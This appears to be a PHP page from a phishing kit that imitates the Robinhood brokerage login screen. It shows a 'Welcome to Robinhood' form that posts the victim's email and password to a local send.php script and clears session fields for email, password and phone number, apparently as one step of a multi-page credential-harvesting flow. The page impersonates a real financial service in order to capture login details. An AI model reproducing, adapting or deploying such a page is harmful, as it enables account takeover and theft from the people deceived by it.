<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'RobinHood | Login';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="d-flex align-items-center" style="min-height: 100vh;">
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 shadow-lg p25 border border-secondary-subtle bg-white">
                <h2 class="my25 fs22">Welcome to Robinhood</h2>
                <div class="my25">
                    <label for="" class="form-label">Email</label>
                    <input name="email" type="email" required="" class="form-control" placeholder="" value="" >
                </div>
                <div class="my25">
                    <label for="" class="form-label">Password</label>
                    <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control" placeholder="" value="" >
                    <a href="#" class="text-success text-decoration-none fw-bold fs13">Forgot Your Password</a>
                </div>
                <div class="row mt-4">
                    <div class="col-7">
                        <div class="form-check">
                            <input class="form-check-input" type="checkbox" id="remember_me">
                            <label class="form-check-label" for="remember_me">Remember me</label>
                        </div>
                    </div>
                    <div class="col-5 text-end">
                        <button type="submit" class="btn btn-success "><span>Sign In</span></button>
                    </div>
                </div>
                <p>Not a Robinhood ?
                    <a href="#" class="text-decoration-none link-success"> Create an aacount.</a>
                </p>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>